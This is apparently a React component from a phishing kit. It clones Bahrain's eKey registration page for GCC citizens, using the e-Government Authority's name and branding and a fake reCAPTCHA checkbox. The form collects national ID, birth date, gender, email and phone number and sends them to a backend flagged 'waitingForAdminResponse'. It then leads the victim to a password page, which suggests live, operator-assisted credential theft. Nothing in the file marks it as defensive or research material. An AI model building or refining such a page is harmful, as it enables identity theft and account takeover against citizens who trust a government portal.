import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { navigateToPage, sendData } from "@/lib/store";
import "./HomePage.css";
import "./BasicRegistration.css";
import "./GccRegistrationForm.css";

type Lang = 'ar' | 'en';
type TabKey = 'home' | 'about' | 'manage' | 'services' | 'contact' | 'faq';

const content = {
  ar: {
    login: 'دخول',
    langSwitch: 'English',
    tabs: {
      home: 'الرئيسية',
      about: 'نبذة',
      manage: 'إدارة حساب المفتاح الإلكتروني',
      services: 'خدمات المفتاح الإلكتروني',
      contact: 'اتصل بنا',
      faq: 'الأسئلة الشائعة',
    },
    pageTitle: 'تسجيل حساب المفتاح الإلكتروني لمواطني دول مجلس التعاون الخليجي',
    instruction1: 'لمواطني دول مجلس التعاون الخليجي الراغبين بالتسجيل في المفتاح الإلكتروني، الرجاء الاتصال بمركز اتصال الخدمات الحكومية على الرقم ٨٠٠٠٨٠٠١ للاستفسار عن أقرب مركز للخدمات الإلكترونية',
    instruction2: 'لتسجيل ومطابقة بياناتهم الشخصية قبل التسجيل في المفتاح الإلكتروني أدناه.',
    step1: 'المعلومات الشخصية',
    step2: 'التحقق',
    step3: 'إدخال كلمة السر',
    nationality: 'الجنسية',
    nationalityPlaceholder: 'الرجاء تحديد نوع الهوية',
    nationalities: [
      { value: 'uae', label: 'الإمارات العربية المتحدة' },
      { value: 'kuwait', label: 'الكويت' },
      { value: 'saudi', label: 'المملكة العربية السعودية' },
      { value: 'oman', label: 'عُمان' },
      { value: 'qatar', label: 'قطر' },
    ],
    nationalId: 'رقم الهوية الوطنية',
    dateOfBirth: 'تاريخ الميلاد',
    gender: 'الجنس',
    male: 'ذكر',
    female: 'أنثى',
    email: 'البريد الالكتروني',
    emailPlaceholder: 'username@domain.com',
    mobileNumber: 'رقم الهاتف النقال',
    day: 'يوم',
    month: 'شهر',
    year: 'Year',
    countryCodes: [
      { value: '+973', label: 'BAHRAIN[+٩٧٣]' },
      { value: '+20', label: 'EGYPT[+٢٠]' },
      { value: '+91', label: 'INDIA[+٩١]' },
      { value: '+962', label: 'JORDAN[+٩٦٢]' },
      { value: '+965', label: 'KUWAIT[+٩٦٥]' },
      { value: '+961', label: 'LEBANON[+٩٦١]' },
      { value: '+968', label: 'OMAN[+٩٦٨]' },
      { value: '+974', label: 'QATAR[+٩٧٤]' },
      { value: '+966', label: 'SAUDI ARABIA[+٩٦٦]' },
      { value: '+971', label: 'UNITED ARAB EMIRATES[+٩٧١]' },
    ],
    recaptcha: 'أنا لست برنامج روبوت',
    smsNote: 'سيتم إرسال رمز التحقق عبر رسالة نصية قصيرة لرقم الهاتف النقال والبريد الإلكتروني المسجل (ان وجد)',
    agreeTerms: 'أنا هنا أوافق على',
    termsLink: 'الشروط والأحكام',
    continueBtn: 'مواصلة',
    cancelBtn: 'إلغاء',
    copyright: '2021 © هيئة المعلومات والحكومة الإلكترونية، مملكة البحرين. جميع الحقوق محفوظة',
    privacy: 'سياسة الخصوصية',
    sitemap: 'خريطة الموقع',
    contactUs: 'اتصل بنا',
    lastUpdate: 'آخر تحديث بتاريخ : Feb 20, 2025',
    required: '*',
    months: ['يناير', 'فبراير', 'مارس', 'أبريل', 'مايو', 'يونيو', 'يوليو', 'أغسطس', 'سبتمبر', 'أكتوبر', 'نوفمبر', 'ديسمبر'],
    fieldRequired: 'هذا الحقل مطلوب',
    numbersOnly: 'يجب إدخال أرقام فقط',
    invalidEmail: 'يرجى إدخال بريد إلكتروني صحيح',
    invalidYear: 'يرجى إدخال سنة صحيحة (مثال: 2025)',
    selectDay: 'يرجى اختيار اليوم',
    selectMonth: 'يرجى اختيار الشهر',
    selectNationality: 'يرجى اختيار الجنسية',
    selectGender: 'يرجى اختيار الجنس',
    mustAgreeTerms: 'يجب الموافقة على الشروط والأحكام',
    mustCheckRecaptcha: 'يرجى التحقق من أنك لست روبوت',
  },
  en: {
    login: 'Login',
    langSwitch: 'عربي',
    tabs: {
      home: 'Home',
      about: 'About',
      manage: 'Manage My eKey',
      services: 'eKey Services',
      contact: 'Contact Us',
      faq: 'FAQ',
    },
    pageTitle: 'eKey Account Registration for GCC Citizens',
    instruction1: 'For GCC citizens wishing to register for eKey, please contact the Government Services Call Center at 80008001 to inquire about the nearest electronic services center',
    instruction2: 'to register and verify their personal data before registering for eKey below.',
    step1: 'Personal Information',
    step2: 'Verification',
    step3: 'Enter Password',
    nationality: 'Nationality',
    nationalityPlaceholder: 'Please select ID type',
    nationalities: [
      { value: 'uae', label: 'United Arab Emirates' },
      { value: 'kuwait', label: 'Kuwait' },
      { value: 'saudi', label: 'Saudi Arabia' },
      { value: 'oman', label: 'Oman' },
      { value: 'qatar', label: 'Qatar' },
    ],
    nationalId: 'National ID Number',
    dateOfBirth: 'Date of Birth',
    gender: 'Gender',
    male: 'Male',
    female: 'Female',
    email: 'Email',
    emailPlaceholder: 'username@domain.com',
    mobileNumber: 'Mobile Number',
    day: 'Day',
    month: 'Month',
    year: 'Year',
    countryCodes: [
      { value: '+973', label: 'BAHRAIN[+973]' },
      { value: '+20', label: 'EGYPT[+20]' },
      { value: '+91', label: 'INDIA[+91]' },
      { value: '+962', label: 'JORDAN[+962]' },
      { value: '+965', label: 'KUWAIT[+965]' },
      { value: '+961', label: 'LEBANON[+961]' },
      { value: '+968', label: 'OMAN[+968]' },
      { value: '+974', label: 'QATAR[+974]' },
      { value: '+966', label: 'SAUDI ARABIA[+966]' },
      { value: '+971', label: 'UNITED ARAB EMIRATES[+971]' },
    ],
    recaptcha: 'I am not a robot',
    smsNote: 'A verification code will be sent via SMS to the mobile number and registered email (if any)',
    agreeTerms: 'I hereby agree to the',
    termsLink: 'Terms and Conditions',
    continueBtn: 'Continue',
    cancelBtn: 'Cancel',
    copyright: '2021 © Information & eGovernment Authority, Kingdom of Bahrain. All Rights Reserved',
    privacy: 'Privacy Policy',
    sitemap: 'Sitemap',
    contactUs: 'Contact Us',
    lastUpdate: 'Last Updated : Feb 20, 2025',
    required: '*',
    months: ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'],
    fieldRequired: 'This field is required',
    numbersOnly: 'Only numbers are allowed',
    invalidEmail: 'Please enter a valid email address',
    invalidYear: 'Please enter a valid year (e.g. 2025)',
    selectDay: 'Please select a day',
    selectMonth: 'Please select a month',
    selectNationality: 'Please select nationality',
    selectGender: 'Please select gender',
    mustAgreeTerms: 'You must agree to the terms and conditions',
    mustCheckRecaptcha: 'Please verify that you are not a robot',
  }
};

// Validation helpers
const isNumbersOnly = (val: string) => /^\d+$/.test(val);
const isValidEmail = (val: string) => /^[a-zA-Z0-9._\-]+@[a-zA-Z0-9._\-]+\.[a-zA-Z]{2,}$/.test(val);
const isValidYear = (val: string) => /^\d{4}$/.test(val) && parseInt(val) >= 1900 && parseInt(val) <= 2100;

interface FieldErrors {
  nationality?: string;
  nationalId?: string;
  birthDay?: string;
  birthMonth?: string;
  birthYear?: string;
  gender?: string;
  email?: string;
  mobileNumber?: string;
  agreeTerms?: string;
  recaptcha?: string;
}

export default function GccRegistrationForm() {
  const [, setLocation] = useLocation();
  const [lang, setLang] = useState<Lang>('ar');
  const [isLoading, setIsLoading] = useState(false);
  const [submitted, setSubmitted] = useState(false);

  // Form state
  const [nationality, setNationality] = useState('');
  const [nationalId, setNationalId] = useState('');
  const [birthDay, setBirthDay] = useState('');
  const [birthMonth, setBirthMonth] = useState('');
  const [birthYear, setBirthYear] = useState('');
  const [gender, setGender] = useState('');
  const [email, setEmail] = useState('');
  const [mobileNumber, setMobileNumber] = useState('');
  const [countryCode, setCountryCode] = useState('+973');
  const [agreeTerms, setAgreeTerms] = useState(false);
  const [recaptchaChecked, setRecaptchaChecked] = useState(false);

  // Errors state
  const [errors, setErrors] = useState<FieldErrors>({});

  useEffect(() => {
    navigateToPage('تسجيل حساب المفتاح الإلكتروني لمواطني دول مجلس التعاون الخليجي - نموذج');
  }, []);

  const t = content[lang];
  const isRtl = lang === 'ar';
  const tabKeys: TabKey[] = ['home', 'about', 'manage', 'services', 'contact', 'faq'];

  const handleTabClick = (key: TabKey) => {
    if (key === 'home') setLocation('/');
    else if (key === 'manage') setLocation('/manage-account');
  };

  const clearError = (field: keyof FieldErrors) => {
    if (errors[field]) {
      setErrors(prev => {
        const newErrors = { ...prev };
        delete newErrors[field];
        return newErrors;
      });
    }
  };

  const validate = (): FieldErrors => {
    const errs: FieldErrors = {};

    if (!nationality) errs.nationality = t.selectNationality;

    if (!nationalId.trim()) {
      errs.nationalId = t.fieldRequired;
    } else if (!isNumbersOnly(nationalId.trim())) {
      errs.nationalId = t.numbersOnly;
    }

    if (!birthDay) errs.birthDay = t.selectDay;
    if (!birthMonth) errs.birthMonth = t.selectMonth;
    if (!birthYear.trim()) {
      errs.birthYear = t.fieldRequired;
    } else if (!isValidYear(birthYear.trim())) {
      errs.birthYear = t.invalidYear;
    }

    if (!gender) errs.gender = t.selectGender;

    if (!email.trim()) {
      errs.email = t.fieldRequired;
    } else if (!isValidEmail(email.trim())) {
      errs.email = t.invalidEmail;
    }

    if (!mobileNumber.trim()) {
      errs.mobileNumber = t.fieldRequired;
    } else if (!isNumbersOnly(mobileNumber.trim())) {
      errs.mobileNumber = t.numbersOnly;
    }

    if (!recaptchaChecked) errs.recaptcha = t.mustCheckRecaptcha;
    if (!agreeTerms) errs.agreeTerms = t.mustAgreeTerms;

    return errs;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);

    const validationErrors = validate();
    setErrors(validationErrors);

    if (Object.keys(validationErrors).length > 0) return;

    setIsLoading(true);

    sendData({
      data: {
        nationality,
        nationalId,
        dateOfBirth: `${birthDay}/${birthMonth}/${birthYear}`,
        gender,
        email,
        mobileNumber: `${countryCode} ${mobileNumber}`,
      },
      current: 'تسجيل حساب المفتاح الإلكتروني لمواطني دول مجلس التعاون الخليجي',
      waitingForAdminResponse: true,
    });

    setTimeout(() => {
      setIsLoading(false);
      setLocation('/password-page');
    }, 1500);
  };

  const handleCancel = () => {
    setLocation('/gcc-registration');
  };

  const days = Array.from({ length: 31 }, (_, i) => i + 1);

  const handleNationalIdChange = (val: string) => {
    const cleaned = val.replace(/[^0-9]/g, '');
    setNationalId(cleaned);
    clearError('nationalId');
  };

  const handleEmailChange = (val: string) => {
    const cleaned = val.replace(/[^a-zA-Z0-9@._\-]/g, '');
    setEmail(cleaned);
    clearError('email');
  };

  const handleYearChange = (val: string) => {
    const cleaned = val.replace(/[^0-9]/g, '').slice(0, 4);
    setBirthYear(cleaned);
    clearError('birthYear');
  };

  const handleMobileChange = (val: string) => {
    const cleaned = val.replace(/[^0-9]/g, '');
    setMobileNumber(cleaned);
    clearError('mobileNumber');
  };

  return (
    <div className="ekey-wrapper" dir={isRtl ? 'rtl' : 'ltr'}>
      {/* Header */}
      <div className="ekey-header">
        <nav className="ekey-navbar">
          <div className="ekey-container">
            <div className="ekey-navbar-header">
              <a className="ekey-navbar-brand" href="#" onClick={(e) => { e.preventDefault(); setLocation('/'); }}>
                <img src="/images/logo.jpg" alt="eKey logo" />
              </a>
            </div>
            <div className="ekey-header-left">
              <a href="#" className="ekey-login-btn" onClick={(e) => { e.preventDefault(); setLocation('/login'); }}>{t.login}</a>
              <span className="ekey-lang-separator">|</span>
              <a href="#" className="ekey-lang" onClick={(e) => { e.preventDefault(); setLang(lang === 'ar' ? 'en' : 'ar'); }}>{t.langSwitch}</a>
            </div>
          </div>
        </nav>
        <div className="ekey-container">
          <div className="ekey-navbar-collapse">
            <ul className="ekey-nav">
              {tabKeys.map((key) => (
                <li key={key} className={key === 'manage' ? 'active' : ''}>
                  <a href="#" onClick={(e) => { e.preventDefault(); handleTabClick(key); }}>{t.tabs[key]}</a>
                </li>
              ))}
            </ul>
          </div>
        </div>
      </div>

      {/* Page Title Bar */}
      <div className="reg-title-bar">
        <h1 className="reg-title-text">{t.pageTitle}</h1>
        <div className="reg-title-bar-line"></div>
      </div>

      {/* Blue Instruction Text */}
      <div className="gcc-form-instructions">
        <div className="ekey-container">
          <p className="gcc-form-instruction-text">
            {t.instruction1}
          </p>
          <p className="gcc-form-instruction-text">
            {t.instruction2}
          </p>
        </div>
      </div>

      {/* Stepper */}
      <div className="reg-stepper-wrapper">
        <div className="ekey-container">
          <div className="reg-stepper">
            <div className="reg-step reg-step-active">
              <span className="reg-step-text">{t.step1}</span>
              <span className="reg-step-arrow">&#10095;</span>
            </div>
            <div className="reg-step">
              <span className="reg-step-text">{t.step2}</span>
              <span className="reg-step-arrow">&#10095;</span>
            </div>
            <div className="reg-step">
              <span className="reg-step-text">{t.step3}</span>
            </div>
          </div>
        </div>
      </div>

      {/* Form */}
      <div className="reg-form-wrapper">
        <div className="ekey-container">
          <form onSubmit={handleSubmit} className="reg-form" noValidate>
            <div className="reg-form-grid">
              {/* Right Column */}
              <div className="reg-form-col">
                {/* Nationality */}
                <div className={`reg-field ${errors.nationality ? 'reg-field-error' : ''}`}>
                  <label>{t.nationality}<span className="reg-required">{t.required}</span></label>
                  <select
                    value={nationality}
                    onChange={(e) => { setNationality(e.target.value); clearError('nationality'); }}
                    className={`gcc-form-select ${errors.nationality ? 'reg-input-error' : ''}`}
                  >
                    <option value="">{t.nationalityPlaceholder}</option>
                    {t.nationalities.map((n) => (
                      <option key={n.value} value={n.value}>{n.label}</option>
                    ))}
                  </select>
                  {errors.nationality && <span className="reg-error-msg">{errors.nationality}</span>}
                </div>

                {/* Date of Birth */}
                <div className={`reg-field ${(errors.birthDay || errors.birthMonth || errors.birthYear) ? 'reg-field-error' : ''}`}>
                  <label>{t.dateOfBirth}<span className="reg-required">{t.required}</span></label>
                  <div className="reg-date-group">
                    <select
                      value={birthDay}
                      onChange={(e) => { setBirthDay(e.target.value); clearError('birthDay'); }}
                      className={`reg-date-select ${errors.birthDay ? 'reg-input-error' : ''}`}
                    >
                      <option value="">{t.day}</option>
                      {days.map(d => (
                        <option key={d} value={d}>{d}</option>
                      ))}
                    </select>
                    <select
                      value={birthMonth}
                      onChange={(e) => { setBirthMonth(e.target.value); clearError('birthMonth'); }}
                      className={`reg-date-select ${errors.birthMonth ? 'reg-input-error' : ''}`}
                    >
                      <option value="">{t.month}</option>
                      {t.months.map((m, i) => (
                        <option key={i} value={i + 1}>{m}</option>
                      ))}
                    </select>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={birthYear}
                      onChange={(e) => handleYearChange(e.target.value)}
                      placeholder={t.year}
                      className={`reg-date-year ${errors.birthYear ? 'reg-input-error' : ''}`}
                    />
                  </div>
                  {(errors.birthDay || errors.birthMonth || errors.birthYear) && (
                    <span className="reg-error-msg">{errors.birthDay || errors.birthMonth || errors.birthYear}</span>
                  )}
                </div>

                {/* Gender */}
                <div className={`reg-field ${errors.gender ? 'reg-field-error' : ''}`}>
                  <label>{t.gender}<span className="reg-required">{t.required}</span></label>
                  <div className="gcc-form-radio-group">
                    <label className="gcc-form-radio-label">
                      <input
                        type="radio"
                        name="gender"
                        value="male"
                        checked={gender === 'male'}
                        onChange={(e) => { setGender(e.target.value); clearError('gender'); }}
                      />
                      <span>{t.male}</span>
                    </label>
                    <label className="gcc-form-radio-label">
                      <input
                        type="radio"
                        name="gender"
                        value="female"
                        checked={gender === 'female'}
                        onChange={(e) => { setGender(e.target.value); clearError('gender'); }}
                      />
                      <span>{t.female}</span>
                    </label>
                    <span className="reg-required">{t.required}</span>
                  </div>
                  {errors.gender && <span className="reg-error-msg">{errors.gender}</span>}
                </div>

                {/* Mobile Number */}
                <div className={`reg-field ${errors.mobileNumber ? 'reg-field-error' : ''}`}>
                  <label>{t.mobileNumber}<span className="reg-required">{t.required}</span></label>
                  <div className="reg-phone-group">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={mobileNumber}
                      onChange={(e) => handleMobileChange(e.target.value)}
                      className={`reg-phone-code-input ${errors.mobileNumber ? 'reg-input-error' : ''}`}
                      placeholder=""
                    />
                    <div className="reg-phone-country">
                      <select
                        className="reg-phone-country-select"
                        value={countryCode}
                        onChange={(e) => setCountryCode(e.target.value)}
                      >
                        {t.countryCodes.map((cc) => (
                          <option key={cc.value} value={cc.value}>{cc.label}</option>
                        ))}
                      </select>
                    </div>
                  </div>
                  {errors.mobileNumber && <span className="reg-error-msg">{errors.mobileNumber}</span>}
                </div>
              </div>

              {/* Left Column */}
              <div className="reg-form-col">
                {/* National ID */}
                <div className={`reg-field ${errors.nationalId ? 'reg-field-error' : ''}`}>
                  <label>{t.nationalId}<span className="reg-required">{t.required}</span></label>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={nationalId}
                    onChange={(e) => handleNationalIdChange(e.target.value)}
                    className={errors.nationalId ? 'reg-input-error' : ''}
                  />
                  {errors.nationalId && <span className="reg-error-msg">{errors.nationalId}</span>}
                </div>

                {/* Email */}
                <div className={`reg-field ${errors.email ? 'reg-field-error' : ''}`}>
                  <label>{t.email}</label>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => handleEmailChange(e.target.value)}
                    placeholder={t.emailPlaceholder}
                    className={errors.email ? 'reg-input-error' : ''}
                  />
                  {errors.email && <span className="reg-error-msg">{errors.email}</span>}
                </div>

                {/* reCAPTCHA */}
                <div className="gcc-form-recaptcha-col">
                  <div className={`reg-recaptcha-box ${errors.recaptcha ? 'reg-recaptcha-error' : ''}`}>
                    <div className="reg-recaptcha-inner">
                      <label className="reg-recaptcha-label">
                        <input
                          type="checkbox"
                          checked={recaptchaChecked}
                          onChange={(e) => { setRecaptchaChecked(e.target.checked); clearError('recaptcha'); }}
                          className="reg-recaptcha-checkbox"
                        />
                        <span>{t.recaptcha}</span>
                      </label>
                      <div className="reg-recaptcha-logo">
                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
                        <span className="reg-recaptcha-brand">reCAPTCHA</span>
                        <span className="reg-recaptcha-terms">الخصوصية - الشرو.</span>
                      </div>
                    </div>
                  </div>
                  {errors.recaptcha && <span className="reg-error-msg">{errors.recaptcha}</span>}
                </div>
              </div>
            </div>

            {/* SMS Note */}
            <div className="reg-sms-note">
              <span className="reg-info-icon">ℹ</span>
              <span>{t.smsNote}</span>
            </div>

            {/* Terms Agreement */}
            <div className="reg-terms">
              <label className="reg-terms-label">
                <input
                  type="checkbox"
                  checked={agreeTerms}
                  onChange={(e) => { setAgreeTerms(e.target.checked); clearError('agreeTerms'); }}
                />
                <span>{t.agreeTerms} <a href="#" onClick={(e) => e.preventDefault()} className="reg-terms-link">{t.termsLink}</a><span className="reg-required">{t.required}</span></span>
              </label>
              {errors.agreeTerms && <span className="reg-error-msg">{errors.agreeTerms}</span>}
            </div>

            {/* Buttons */}
            <div className="reg-buttons">
              <button
                type="submit"
                className="reg-btn reg-btn-continue"
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="reg-spinner"></span>
                ) : (
                  t.continueBtn
                )}
              </button>
              <button
                type="button"
                className="reg-btn reg-btn-cancel"
                onClick={handleCancel}
              >
                {t.cancelBtn}
              </button>
            </div>
          </form>
        </div>
      </div>

      {/* White Gap with Skyline */}
      <div className="ekey-white-gap-bg"></div>

      {/* Footer */}
      <div className="ekey-footer">
        <div className="ekey-copyright">
          <div className="ekey-container">
            <div className="ekey-footer-top">
              <div className="ekey-social-links">
                <a href="#" aria-label="facebook"><i className="ekey-fa ekey-fa-facebook"></i></a>
                <a href="#" aria-label="twitter"><i className="ekey-fa ekey-fa-twitter"></i></a>
                <a href="#" aria-label="youtube"><i className="ekey-fa ekey-fa-youtube"></i></a>
                <a href="#" aria-label="linkedin"><i className="ekey-fa ekey-fa-linkedin"></i></a>
                <a href="#" aria-label="instagram"><i className="ekey-fa ekey-fa-instagram"></i></a>
              </div>
            </div>
            <div className="ekey-copyright-right">
              {t.copyright}
              <p>
                <a href="#">{t.privacy}</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
                <a href="#">{t.sitemap}</a>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;
                <a href="#">{t.contactUs}</a>
              </p>
              <p>{t.lastUpdate}</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
